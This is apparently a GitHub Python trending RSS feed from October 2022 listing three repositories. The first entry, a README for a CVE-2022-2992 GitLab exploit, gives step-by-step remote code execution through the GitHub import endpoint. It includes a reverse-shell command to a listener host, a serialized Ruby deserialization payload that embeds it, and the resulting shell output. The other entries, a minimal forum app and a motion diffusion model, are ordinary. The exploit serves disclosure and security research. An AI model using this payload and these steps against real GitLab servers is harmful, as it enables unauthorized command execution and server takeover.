<?xml version="1.0" encoding="UTF-8"?><feed xmlns="http://www.w3.org/2005/Atom">
  <title>GitHub Python Daily Trending</title>
  <id>http://mshibanami.github.io/GitHubTrendingRSS</id>
  <updated>2022-10-13T01:37:21Z</updated>
  <subtitle>Daily Trending of Python in GitHub</subtitle>
  <link href="http://mshibanami.github.io/GitHubTrendingRSS"></link>
  <entry>
    <title>CsEnox/CVE-2022-2992</title>
    <updated>2022-10-13T01:37:21Z</updated>
    <id>tag:github.com,2022-10-13:/CsEnox/CVE-2022-2992</id>
    <link href="https://github.com/CsEnox/CVE-2022-2992" rel="alternate"></link>
    <summary type="html">&lt;p&gt;Authenticated Remote Command Execution in Gitlab via GitHub import&lt;/p&gt;&lt;hr&gt;&lt;h1&gt;CVE-2022-2992&lt;/h1&gt; &#xA;&lt;p&gt;Authenticated Remote Command Execution in Gitlab via GitHub import.&lt;/p&gt; &#xA;&lt;blockquote&gt; &#xA; &lt;p&gt;A vulnerability in GitLab CE/EE affecting all versions from 11.10 before 15.1.6, all versions starting from 15.2 before 15.2.4, all versions starting from 15.3 before 15.3.2. allows an authenticated user to achieve remote code execution via the Import from GitHub API endpoint.&lt;/p&gt; &#xA;&lt;/blockquote&gt; &#xA;&lt;p&gt;&lt;a href=&#34;https://about.gitlab.com/releases/2022/08/30/critical-security-release-gitlab-15-3-2-released/#remote-command-execution-via-github-import&#34;&gt;https://about.gitlab.com/releases/2022/08/30/critical-security-release-gitlab-15-3-2-released/#remote-command-execution-via-github-import&lt;/a&gt;&lt;/p&gt; &#xA;&lt;h2&gt;Prerequisites&lt;/h2&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://ngrok.com/&#34;&gt;Ngrok&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;Ruby&lt;/li&gt; &#xA; &lt;li&gt;Redis&lt;/li&gt; &#xA; &lt;li&gt;Python3&lt;/li&gt; &#xA; &lt;li&gt;Flask&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;pre&gt;&lt;code&gt;sudo apt install ruby python3 python3-pip&#xA;gem install redis &#xA;pip install flask&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;hr&gt; &#xA;&lt;h2&gt;Steps&lt;/h2&gt; &#xA;&lt;ol&gt; &#xA; &lt;li&gt;Run &lt;code&gt;./ngrok http 5000&lt;/code&gt; and save the URL.&lt;/li&gt; &#xA; &lt;li&gt;Now to generate the serialized payload run &lt;a href=&#34;https://github.com/CsEnox/CVE-2022-2992/raw/main/payload_gen.rb&#34;&gt;payload_gen.rb&lt;/a&gt; and save the payload. Below is an example:&lt;/li&gt; &#xA;&lt;/ol&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;ruby payload_gen.rb &#39;bash -c &#34;sh -i &amp;gt;&amp;amp; /dev/tcp/172.16.128.129/443 0&amp;gt;&amp;amp;1&#34;&#39;&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;ol start=&#34;3&#34;&gt; &#xA; &lt;li&gt;In &lt;a href=&#34;https://github.com/CsEnox/CVE-2022-2992/raw/main/server.py&#34;&gt;server.py&lt;/a&gt; update NGROK_URL and PAYLOAD variables accordingly. Below is an example:&lt;/li&gt; &#xA;&lt;/ol&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-py&#34;&gt;PAYLOAD = &#39;ggg\r\n*3\r\n$3\r\nset\r\n$19\r\nsession:gitlab:gggg\r\n$359\r\n\u0004\b[\bc\u0015Gem::SpecFetcherc\u0013Gem::InstallerU:\u0015Gem::Requirement[\u0006o:\u001cGem::Package::TarReader\u0006:\b@ioo:\u0014Net::BufferedIO\u0007;\u0007o:#Gem::Package::TarReader::Entry\u0007:\n@readi\u0000:\f@headerI\&#34;\baaa\u0006:\u0006ET:\u0012@debug_outputo:\u0016Net::WriteAdapter\u0007:\f@socketo:\u0014Gem::RequestSet\u0007:\n@setso;\u000e\u0007;\u000fm\u000bKernel:\u000f@method_id:\u000bsystem:\r@git_setI\&#34;8bash -c \&#34;sh -i &amp;gt;&amp;amp; /dev/tcp/172.16.128.129/443 0&amp;gt;&amp;amp;1\&#34;\u0006;\fT;\u0012:\fresolve&#39;&#xA;NGROK_URL = &#39;https://dc09-41-01-99-69.in.ngrok.io&#39;&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;ol start=&#34;4&#34;&gt; &#xA; &lt;li&gt;Create an access token for the user on gitlab and select all scopes. Please read the documentation &lt;a href=&#34;https://docs.gitlab.com/ee/user/profile/personal_access_tokens.html&#34;&gt;here&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;Finally firing off our &lt;a href=&#34;https://github.com/CsEnox/CVE-2022-2992/raw/main/exploit.py&#34;&gt;exploit.py&lt;/a&gt;.&lt;/li&gt; &#xA;&lt;/ol&gt; &#xA;&lt;p&gt;&lt;strong&gt;NOTE&lt;/strong&gt;: Before running make sure ngrok and flask server are running.&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-py&#34;&gt;python3 exploit.py -a lunpy-AMEuQE66KcUtNhcharjm5 -u https://dc09-41-01-99-69.in.ngrok.io -t http://gitlab.example&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;We get a shell back on port 443&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;âžœ CVE-2022-2992: nc -nlvp 443&#xA;listening on [any] 443 ...&#xA;connect to [172.16.128.129] from (UNKNOWN) [172.16.128.180] 40270&#xA;sh: 0: can&#39;t access tty; job control turned off&#xA;$ id&#xA;uid=998(git) gid=998(git) groups=998(git)&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;hr&gt; &#xA;&lt;h3&gt;Expected output in each window:&lt;/h3&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;Ngrok&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-http&#34;&gt;POST /vakzz/public.git/git-upload-pack 200 OK&#xA;GET  /vakzz/public.git/info/refs       200 OK&#xA;GET  /api/v3/repos/fake/name           200 OK&#xA;GET  /api/v3/repositories/12345        200 OK&#xA;GET  /api/v3/rate_limit                200 OK&#xA;GET  /api/v3/rate_limit                200 OK&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;Exploit&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-py&#34;&gt;[1] Creating Group&#xA;[+] Successfully created group: qogjohpykk&#xA;[2] Running flask server&#xA;[3] Importing Github Repo&#xA; * Serving Flask app &#34;server&#34; (lazy loading)&#xA; * Environment: production&#xA;   WARNING: This is a development server. Do not use it in a production deployment.&#xA;   Use a production WSGI server instead.&#xA; * Debug mode: off&#xA; * Running on http://0.0.0.0:5000/ (Press CTRL+C to quit)&#xA;127.0.0.1 - - [08/Oct/2022 23:46:03] &#34;GET /api/v3/rate_limit HTTP/1.1&#34; 200 -&#xA;127.0.0.1 - - [08/Oct/2022 23:46:03] &#34;GET /api/v3/rate_limit HTTP/1.1&#34; 200 -&#xA;127.0.0.1 - - [08/Oct/2022 23:46:03] &#34;GET /api/v3/repositories/12345 HTTP/1.1&#34; 200 -&#xA;201&#xA;127.0.0.1 - - [08/Oct/2022 23:46:04] &#34;GET /vakzz/public.git/info/refs?service=git-upload-pack HTTP/1.1&#34; 200 -&#xA;127.0.0.1 - - [08/Oct/2022 23:46:04] &#34;POST /vakzz/public.git/git-upload-pack HTTP/1.1&#34; 200 -&#xA;127.0.0.1 - - [08/Oct/2022 23:46:04] &#34;GET /api/v3/repos/fake/name HTTP/1.1&#34; 200 -&#xA;[4] Triggering Payload&#xA;[+] Command was executed&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;hr&gt; &#xA;&lt;h2&gt;Environment&lt;/h2&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;Tested on Gitlab 15.3.1 Enterprise Edition&lt;/li&gt; &#xA; &lt;li&gt;For building your own environment for testing, copy the &lt;a href=&#34;https://github.com/CsEnox/CVE-2022-2992/tree/main/data&#34;&gt;data&lt;/a&gt; directory to &lt;code&gt;/&lt;/code&gt; on your Linux VM.&lt;/li&gt; &#xA; &lt;li&gt;Run build.sh to setup the environment. Once the script finishes executing you can login using the following credentials on gitlab.&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;pre&gt;&lt;code&gt;Username: enox&#xA;Email: enox@gitlab.example&#xA;Password: StrongestGitlabPassword&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;hr&gt; &#xA;&lt;h2&gt;Credits&lt;/h2&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://hackerone.com/reports/1679624&#34;&gt;https://hackerone.com/reports/1679624&lt;/a&gt; (vakzz)&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://devcraft.io/2021/01/07/universal-deserialisation-gadget-for-ruby-2-x-3-x.html&#34;&gt;https://devcraft.io/2021/01/07/universal-deserialisation-gadget-for-ruby-2-x-3-x.html&lt;/a&gt;&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;p&gt;If you have any questions reach out to me on &lt;a href=&#34;https://discord.com/&#34;&gt;Discord&lt;/a&gt; (Enox#4458)&lt;/p&gt;</summary>
  </entry>
  <entry>
    <title>Demindiro/agreper</title>
    <updated>2022-10-13T01:37:21Z</updated>
    <id>tag:github.com,2022-10-13:/Demindiro/agreper</id>
    <link href="https://github.com/Demindiro/agreper" rel="alternate"></link>
    <summary type="html">&lt;p&gt;Minimal, no-JS web forum software&lt;/p&gt;&lt;hr&gt;&lt;h1&gt;Agreper - minimal, no-JS forum software&lt;/h1&gt; &#xA;&lt;p&gt;&lt;strong&gt;For security issues, please send a mail to &lt;a href=&#34;mailto:agreper+security@demindiro.com&#34;&gt;agreper+security@demindiro.com&lt;/a&gt;&lt;/strong&gt;&lt;/p&gt; &#xA;&lt;p&gt;&lt;img src=&#34;https://static.agreper.com/hello_world.png&#34; alt=&#34;Hello world!&#34;&gt;&lt;/p&gt; &#xA;&lt;p&gt;Agreper is a forum board with a focus on being easy to set up and manage.&lt;/p&gt; &#xA;&lt;h2&gt;Install &amp;amp; running&lt;/h2&gt; &#xA;&lt;h3&gt;Linux&lt;/h3&gt; &#xA;&lt;p&gt;Ensure you have the necessary packages, e.g. for Debian:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;apt install git make sqlite3 python3-venv python3-pip&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;First clone or &lt;a href=&#34;https://github.com/Demindiro/agreper/archive/refs/tags/v0.1.1.tar.gz&#34;&gt;download the latest release&lt;/a&gt;.&lt;/p&gt; &#xA;&lt;p&gt;Then setup with:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;./init_sqlite.sh forum.db&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;Lastly, run with:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;./run_sqlite.sh forum.db forum.pid&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;You will need a proxy such as nginx to access the forum on the public internet.&lt;/p&gt; &#xA;&lt;h2&gt;Screenshots&lt;/h2&gt; &#xA;&lt;p&gt;&lt;img src=&#34;https://static.agreper.com/index.png&#34; alt=&#34;Index&#34;&gt; &lt;img src=&#34;https://static.agreper.com/forum.png&#34; alt=&#34;Forum&#34;&gt; &lt;img src=&#34;https://static.agreper.com/admin_panel.png&#34; alt=&#34;Admin panel&#34;&gt;&lt;/p&gt;</summary>
  </entry>
  <entry>
    <title>GuyTevet/motion-diffusion-model</title>
    <updated>2022-10-13T01:37:21Z</updated>
    <id>tag:github.com,2022-10-13:/GuyTevet/motion-diffusion-model</id>
    <link href="https://github.com/GuyTevet/motion-diffusion-model" rel="alternate"></link>
    <summary type="html">&lt;p&gt;The official PyTorch implementation of the paper &#34;Human Motion Diffusion Model&#34;&lt;/p&gt;&lt;hr&gt;&lt;h1&gt;MDM: Human Motion Diffusion Model&lt;/h1&gt; &#xA;&lt;p&gt;&lt;a href=&#34;https://paperswithcode.com/sota/motion-synthesis-on-humanact12?p=human-motion-diffusion-model&#34;&gt;&lt;img src=&#34;https://img.shields.io/endpoint.svg?url=https://paperswithcode.com/badge/human-motion-diffusion-model/motion-synthesis-on-humanact12&#34; alt=&#34;PWC&#34;&gt;&lt;/a&gt; &lt;a href=&#34;https://paperswithcode.com/sota/motion-synthesis-on-humanml3d?p=human-motion-diffusion-model&#34;&gt;&lt;img src=&#34;https://img.shields.io/endpoint.svg?url=https://paperswithcode.com/badge/human-motion-diffusion-model/motion-synthesis-on-humanml3d&#34; alt=&#34;PWC&#34;&gt;&lt;/a&gt; &lt;a href=&#34;https://arxiv.org/abs/2209.14916&#34;&gt;&lt;img src=&#34;https://img.shields.io/badge/arXiv-%3C2209.14916%3E-%3CCOLOR%3E.svg?sanitize=true&#34; alt=&#34;arXiv&#34;&gt;&lt;/a&gt;&lt;/p&gt; &#xA;&lt;p&gt;The official PyTorch implementation of the paper &lt;a href=&#34;https://arxiv.org/abs/2209.14916&#34;&gt;&lt;strong&gt;&#34;Human Motion Diffusion Model&#34;&lt;/strong&gt;&lt;/a&gt;.&lt;/p&gt; &#xA;&lt;p&gt;Please visit our &lt;a href=&#34;https://guytevet.github.io/mdm-page/&#34;&gt;&lt;strong&gt;webpage&lt;/strong&gt;&lt;/a&gt; for more details.&lt;/p&gt; &#xA;&lt;p&gt;&lt;img src=&#34;https://github.com/GuyTevet/mdm-page/raw/main/static/figures/github.gif&#34; alt=&#34;teaser&#34;&gt;&lt;/p&gt; &#xA;&lt;h4&gt;Bibtex&lt;/h4&gt; &#xA;&lt;p&gt;If you find this code useful in your research, please cite:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;@article{tevet2022human,&#xA;  title={Human Motion Diffusion Model},&#xA;  author={Tevet, Guy and Raab, Sigal and Gordon, Brian and Shafir, Yonatan and Bermano, Amit H and Cohen-Or, Daniel},&#xA;  journal={arXiv preprint arXiv:2209.14916},&#xA;  year={2022}&#xA;}&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h2&gt;News&lt;/h2&gt; &#xA;&lt;p&gt;ðŸ“¢ &lt;strong&gt;9/Oct/22&lt;/strong&gt; - Added training and evaluation scripts. Note slight env changes adapting to the new code. If you already have an installed environment, run &lt;code&gt;bash prepare/download_glove.sh; pip install clearml&lt;/code&gt; to adapt.&lt;/p&gt; &#xA;&lt;p&gt;ðŸ“¢ &lt;strong&gt;6/Oct/22&lt;/strong&gt; - First release - sampling and rendering using pre-trained models.&lt;/p&gt; &#xA;&lt;h2&gt;Getting started&lt;/h2&gt; &#xA;&lt;p&gt;This code was tested on &lt;code&gt;Ubuntu 18.04.5 LTS&lt;/code&gt; and requires:&lt;/p&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;Python 3.7&lt;/li&gt; &#xA; &lt;li&gt;conda3 or miniconda3&lt;/li&gt; &#xA; &lt;li&gt;CUDA capable GPU (one is enough)&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h3&gt;1. Setup environment&lt;/h3&gt; &#xA;&lt;p&gt;Install ffmpeg (if not already installed):&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-shell&#34;&gt;sudo apt update&#xA;sudo apt install ffmpeg&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;For windows use &lt;a href=&#34;https://www.geeksforgeeks.org/how-to-install-ffmpeg-on-windows/&#34;&gt;this&lt;/a&gt; instead.&lt;/p&gt; &#xA;&lt;p&gt;Setup conda env:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-shell&#34;&gt;conda env create -f environment.yml&#xA;conda activate mdm&#xA;python -m spacy download en_core_web_sm&#xA;pip install git+https://github.com/openai/CLIP.git&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;Download dependencies:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;bash prepare/download_smpl_files.sh&#xA;bash prepare/download_glove.sh&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h3&gt;2. Get data&lt;/h3&gt; &#xA;&lt;p&gt;There are two paths to get the data:&lt;/p&gt; &#xA;&lt;p&gt;(a) &lt;strong&gt;Go the easy way if&lt;/strong&gt; you just want to generate text-to-motion (excluding editing which does require motion capture data)&lt;/p&gt; &#xA;&lt;p&gt;(b) &lt;strong&gt;Get full data&lt;/strong&gt; to train and evaluate the model.&lt;/p&gt; &#xA;&lt;h4&gt;a. The easy way (text only)&lt;/h4&gt; &#xA;&lt;p&gt;&lt;strong&gt;HumanML3D&lt;/strong&gt; - Clone HumanML3D, then copy the data dir to our repository:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-shell&#34;&gt;cd ..&#xA;git clone https://github.com/EricGuo5513/HumanML3D.git&#xA;unzip ./HumanML3D/HumanML3D/texts.zip -d ./HumanML3D/HumanML3D/&#xA;cp -r HumanML3D/HumanML3D motion-diffusion-model/dataset/HumanML3D&#xA;cd motion-diffusion-model&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h4&gt;b. Full data (text + motion capture)&lt;/h4&gt; &#xA;&lt;p&gt;&lt;strong&gt;HumanML3D&lt;/strong&gt; - Follow the instructions in &lt;a href=&#34;https://github.com/EricGuo5513/HumanML3D.git&#34;&gt;HumanML3D&lt;/a&gt;, then copy the result dataset to our repository:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-shell&#34;&gt;cp -r ../HumanML3D/HumanML3D ./dataset/HumanML3D&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;&lt;strong&gt;KIT&lt;/strong&gt; - Download from &lt;a href=&#34;https://github.com/EricGuo5513/HumanML3D.git&#34;&gt;HumanML3D&lt;/a&gt; (no processing needed this time) and the place result in &lt;code&gt;./dataset/KIT-ML&lt;/code&gt;&lt;/p&gt; &#xA;&lt;h3&gt;3. Download the pretrained models&lt;/h3&gt; &#xA;&lt;p&gt;Download the model(s) you wish to use, then unzip and place it in &lt;code&gt;./save/&lt;/code&gt;. &lt;strong&gt;For text-to-motion, you need only the first one.&lt;/strong&gt;&lt;/p&gt; &#xA;&lt;p&gt;&lt;strong&gt;HumanML3D&lt;/strong&gt;&lt;/p&gt; &#xA;&lt;p&gt;&lt;a href=&#34;https://drive.google.com/file/d/1PE0PK8e5a5j-7-Xhs5YET5U5pGh0c821/view?usp=sharing&#34;&gt;humanml-encoder-512&lt;/a&gt; (best model)&lt;/p&gt; &#xA;&lt;p&gt;&lt;a href=&#34;https://drive.google.com/file/d/1q3soLadvVh7kJuJPd2cegMNY2xVuVudj/view?usp=sharing&#34;&gt;humanml-decoder-512&lt;/a&gt;&lt;/p&gt; &#xA;&lt;p&gt;&lt;a href=&#34;https://drive.google.com/file/d/1GnsW0K3UjuOkNkAWmjrGIUmeDDZrmPE5/view?usp=sharing&#34;&gt;humanml-decoder-with-emb-512&lt;/a&gt;&lt;/p&gt; &#xA;&lt;p&gt;&lt;strong&gt;KIT&lt;/strong&gt;&lt;/p&gt; &#xA;&lt;p&gt;&lt;a href=&#34;https://drive.google.com/file/d/1SHCRcE0es31vkJMLGf9dyLe7YsWj7pNL/view?usp=sharing&#34;&gt;kit-encoder-512&lt;/a&gt;&lt;/p&gt; &#xA;&lt;h2&gt;Generate text-to-motion&lt;/h2&gt; &#xA;&lt;h3&gt;Generate from test set prompts&lt;/h3&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-shell&#34;&gt;python -m sample --model_path ./save/humanml_trans_enc_512/model000200000.pt --num_samples 10 --num_repetitions 3&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h3&gt;Generate from your text file&lt;/h3&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-shell&#34;&gt;python -m sample --model_path ./save/humanml_trans_enc_512/model000200000.pt --input_text ./assets/example_text_prompts.txt&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h3&gt;Generate a single prompt&lt;/h3&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-shell&#34;&gt;python -m sample --model_path ./save/humanml_trans_enc_512/model000200000.pt --text_prompt &#34;the person walked forward and is picking up his toolbox.&#34;&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;&lt;strong&gt;You can also define:&lt;/strong&gt;&lt;/p&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;&lt;code&gt;--device&lt;/code&gt; id.&lt;/li&gt; &#xA; &lt;li&gt;&lt;code&gt;--seed&lt;/code&gt; to sample different prompts.&lt;/li&gt; &#xA; &lt;li&gt;&lt;code&gt;--motion_length&lt;/code&gt; in seconds (maximum is 9.8[sec]).&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;p&gt;&lt;strong&gt;Running those will get you:&lt;/strong&gt;&lt;/p&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;&lt;code&gt;results.npy&lt;/code&gt; file with text prompts and xyz positions of the generated animation&lt;/li&gt; &#xA; &lt;li&gt;&lt;code&gt;sample##_rep##.mp4&lt;/code&gt; - a stick figure animation for each generated motion.&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;p&gt;It will look something like this:&lt;/p&gt; &#xA;&lt;p&gt;&lt;img src=&#34;https://raw.githubusercontent.com/GuyTevet/motion-diffusion-model/main/assets/example_stick_fig.gif&#34; alt=&#34;example&#34;&gt;&lt;/p&gt; &#xA;&lt;p&gt;You can stop here, or render the SMPL mesh using the following script.&lt;/p&gt; &#xA;&lt;h3&gt;Render SMPL mesh&lt;/h3&gt; &#xA;&lt;p&gt;To create SMPL mesh per frame run:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-shell&#34;&gt;python -m visualize.render_mesh --input_path /path/to/mp4/stick/figure/file&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;&lt;strong&gt;This script outputs:&lt;/strong&gt;&lt;/p&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;&lt;code&gt;sample##_rep##_smpl_params.npy&lt;/code&gt; - SMPL parameters (thetas, root translations, vertices and faces)&lt;/li&gt; &#xA; &lt;li&gt;&lt;code&gt;sample##_rep##_obj&lt;/code&gt; - Mesh per frame in &lt;code&gt;.obj&lt;/code&gt; format.&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;p&gt;&lt;strong&gt;Notes:&lt;/strong&gt;&lt;/p&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;The &lt;code&gt;.obj&lt;/code&gt; can be integrated into Blender/Maya/3DS-MAX and rendered using them.&lt;/li&gt; &#xA; &lt;li&gt;This script is running &lt;a href=&#34;https://smplify.is.tue.mpg.de/&#34;&gt;SMPLify&lt;/a&gt; and needs GPU as well (can be specified with the &lt;code&gt;--device&lt;/code&gt; flag).&lt;/li&gt; &#xA; &lt;li&gt;&lt;strong&gt;Important&lt;/strong&gt; - Do not change the original &lt;code&gt;.mp4&lt;/code&gt; path before running the script.&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;p&gt;&lt;strong&gt;Notes for 3d makers:&lt;/strong&gt;&lt;/p&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;You have two ways to animate the sequence: &#xA;  &lt;ol&gt; &#xA;   &lt;li&gt;Use the &lt;a href=&#34;https://smpl.is.tue.mpg.de/index.html&#34;&gt;SMPL add-on&lt;/a&gt; and the theta parameters saved to &lt;code&gt;sample##_rep##_smpl_params.npy&lt;/code&gt; (we always use beta=0 and the gender-neutral model).&lt;/li&gt; &#xA;   &lt;li&gt;A more straightforward way is using the mesh data itself. All meshes have the same topology (SMPL), so you just need to keyframe vertex locations. Since the OBJs are not preserving vertices order, we also save this data to the &lt;code&gt;sample##_rep##_smpl_params.npy&lt;/code&gt; file for your convenience.&lt;/li&gt; &#xA;  &lt;/ol&gt; &lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h3&gt;Editing&lt;/h3&gt; &#xA;&lt;p&gt;ETA - Nov 22&lt;/p&gt; &#xA;&lt;h2&gt;Train your own MDM&lt;/h2&gt; &#xA;&lt;p&gt;&lt;strong&gt;HumanML3D&lt;/strong&gt;&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-shell&#34;&gt;python -m train.train_mdm --save_dir save/my_humanml_trans_enc_512 --dataset humanml&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;&lt;strong&gt;KIT&lt;/strong&gt;&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-shell&#34;&gt;python -m train.train_mdm --save_dir save/my_kit_trans_enc_512 --dataset kit&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;Use &lt;code&gt;--device&lt;/code&gt; to define GPU id.&lt;/li&gt; &#xA; &lt;li&gt;Use &lt;code&gt;--arch&lt;/code&gt; to choose one of the architectures reported in the paper &lt;code&gt;{trans_enc, trans_dec, gru}&lt;/code&gt; (&lt;code&gt;trans_enc&lt;/code&gt; is default).&lt;/li&gt; &#xA; &lt;li&gt;Add &lt;code&gt;--train_platform_type {ClearmlPlatform, TensorboardPlatform}&lt;/code&gt; to track results with either &lt;a href=&#34;https://clear.ml/&#34;&gt;ClearML&lt;/a&gt; or &lt;a href=&#34;https://www.tensorflow.org/tensorboard&#34;&gt;Tensorboard&lt;/a&gt;.&lt;/li&gt; &#xA; &lt;li&gt;Add &lt;code&gt;--eval_during_training&lt;/code&gt; to run a short (90 minutes) evaluation for each saved checkpoint. This will slow down training but will give you better monitoring.&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h2&gt;Evaluate&lt;/h2&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;Takes about 20 hours (on a single GPU)&lt;/li&gt; &#xA; &lt;li&gt;The output of this script for the pre-trained models (as was reported in the paper) is provided in the checkpoints zip file.&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;p&gt;&lt;strong&gt;HumanML3D&lt;/strong&gt;&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-shell&#34;&gt;python -m eval.eval_humanml --model_path ./save/humanml_trans_enc_512/model000475000.pt&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;&lt;strong&gt;KIT&lt;/strong&gt;&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-shell&#34;&gt;python -m eval.eval_humanml --model_path ./save/kit_trans_enc_512/model000400000.pt&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h2&gt;Acknowledgments&lt;/h2&gt; &#xA;&lt;p&gt;This code is standing on the shoulders of giants. We want to thank the following contributors that our code is based on:&lt;/p&gt; &#xA;&lt;p&gt;&lt;a href=&#34;https://github.com/openai/guided-diffusion&#34;&gt;guided-diffusion&lt;/a&gt;, &lt;a href=&#34;https://github.com/GuyTevet/MotionCLIP&#34;&gt;MotionCLIP&lt;/a&gt;, &lt;a href=&#34;https://github.com/EricGuo5513/text-to-motion&#34;&gt;text-to-motion&lt;/a&gt;, &lt;a href=&#34;https://github.com/Mathux/ACTOR&#34;&gt;actor&lt;/a&gt;, &lt;a href=&#34;https://github.com/wangsen1312/joints2smpl&#34;&gt;joints2smpl&lt;/a&gt;.&lt;/p&gt; &#xA;&lt;h2&gt;License&lt;/h2&gt; &#xA;&lt;p&gt;This code is distributed under an &lt;a href=&#34;https://raw.githubusercontent.com/GuyTevet/motion-diffusion-model/main/LICENSE&#34;&gt;MIT LICENSE&lt;/a&gt;.&lt;/p&gt; &#xA;&lt;p&gt;Note that our code depends on other libraries, including CLIP, SMPL, SMPL-X, PyTorch3D, and uses datasets that each have their own respective licenses that must also be followed.&lt;/p&gt;</summary>
  </entry>
</feed>